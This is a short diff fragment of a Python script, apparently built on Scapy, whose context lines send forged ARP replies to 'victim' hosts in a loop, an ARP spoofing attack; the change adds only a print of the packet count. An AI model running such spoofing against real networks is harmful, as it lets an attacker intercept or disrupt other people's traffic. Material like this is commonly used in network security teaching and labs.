@@ -30,3 +30,5 @@ while nb_packets < 100:
     spoof_arp_victim2 = ARP(op=2, psrc=victim1_IP, hwdst=victim2_MAC, pdst=victim2_IP)
     send_spoof2 = sendp(spoof_arp_victim2)
     nb_packets += 2
+
+print(nb_packets)
